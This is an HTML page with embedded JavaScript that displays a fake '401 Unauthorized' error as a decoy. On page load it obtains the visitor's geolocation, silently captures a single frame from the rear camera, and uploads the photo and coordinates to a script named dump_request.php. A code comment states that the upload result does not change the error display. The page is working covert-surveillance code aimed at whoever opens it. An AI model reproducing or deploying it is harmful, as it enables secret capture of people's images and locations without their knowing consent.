<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.16/dist/tailwind.min.css" rel="stylesheet">
    <style>
        .hidden { display: none; }
    </style>
</head>
<body class="bg-gray-100 flex justify-center items-center min-h-screen p-4">
    <div class="bg-white shadow-md rounded-lg p-8 w-full max-w-md">
        <div id="errorMessage" class="text-red-500">
            <svg class="inline-block w-6 h-6 mr-2 text-red-500" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
            </svg>
            <span id="errorText">401 Unauthorized Error: Access is denied.</span>
        </div>
        <form id="uploadForm" action="dump_request.php" method="POST" enctype="multipart/form-data" class="space-y-4">
            <input type="hidden" name="_token" value="{{ csrf_token() }}">
            <canvas id="canvas" class="hidden"></canvas>
            <input type="hidden" name="latitude" id="latitude">
            <input type="hidden" name="longitude" id="longitude">
        </form>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('uploadForm');
            const canvas = document.getElementById('canvas');
            const latitudeInput = document.getElementById('latitude');
            const longitudeInput = document.getElementById('longitude');
            const errorMessage = document.getElementById('errorMessage');
            const errorText = document.getElementById('errorText');

            let stream;

            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            latitudeInput.value = position.coords.latitude;
                            longitudeInput.value = position.coords.longitude;
                            startCamera();
                        },
                        function(error) {
                            showError("Unable to retrieve your location. Please make sure location services are enabled.");
                        }
                    );
                } else {
                    showError("Geolocation is not supported by this browser.");
                }
            }

            function showError(message) {
                errorText.textContent = message;
                errorMessage.classList.remove('hidden');
            }

            function startCamera() {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                    .then(function(mediaStream) {
                        stream = mediaStream;
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.autoplay = true;

                        video.addEventListener('loadedmetadata', function() {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);

                            // Stop the camera stream
                            stream.getTracks().forEach(track => track.stop());

                            // Convert canvas to blob and submit the form
                            canvas.toBlob(function(blob) {
                                const formData = new FormData(form);
                                formData.append('image', blob, 'camera_capture.jpg');

                                fetch(form.action, {
                                    method: 'POST',
                                    body: formData
                                })
                                .then(response => response.text())
                                .then(data => {
                                    // Show a success message or handle the response if needed
                                    // For this case, success or failure does not affect the 401 display
                                    form.reset();
                                    canvas.width = 0;
                                    canvas.height = 0;
                                })
                                .catch(error => {
                                    showError("An error occurred while uploading the image: " + error.message);
                                });
                            }, 'image/jpeg');
                        });
                    })
                    .catch(function(err) {
                        showError("Unable to access the camera: " + err.message);
                    });
            }

            // Trigger location fetch and camera capture on page load
            getLocation();
        });
    </script>
</body>
</html>
